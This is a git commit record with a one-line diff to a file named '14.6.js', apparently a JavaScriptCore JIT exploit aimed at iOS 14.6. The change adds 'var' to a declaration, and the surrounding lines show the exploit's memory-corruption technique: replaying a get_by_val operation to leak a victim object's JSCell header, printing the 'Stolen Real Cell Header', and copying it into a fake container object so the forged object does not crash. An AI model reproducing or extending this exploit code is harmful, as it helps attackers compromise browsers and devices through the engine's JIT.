075e3868ca41f97f80369202b5f4ef36c7f46e19
Turnerhackz1 <turner881189@gmail.com>
2022-07-05 23:28:26 -0500

    Update 14.6.js

--- 14.6.js
+++ 14.6.js
@@ -597,7 +597,7 @@ fortunately fairly easy: execute the same get_by_val op twice, the second time w
 	    //but the second time it will grab victim1 object essentially clearing the JITCache
         results.push(a[0]); //push the results to results array
     }
-    jscell_header = results[0]; //make jscell_header equal that of victim1
+    var jscell_header = results[0]; //make jscell_header equal that of victim1
     print("Stolen Real Cell Header: " + new Int64.fromDouble(js_header))
 //now we can set container to the real JSCellHeader so we wont ever crash :)
 	      container.header = jscell_header
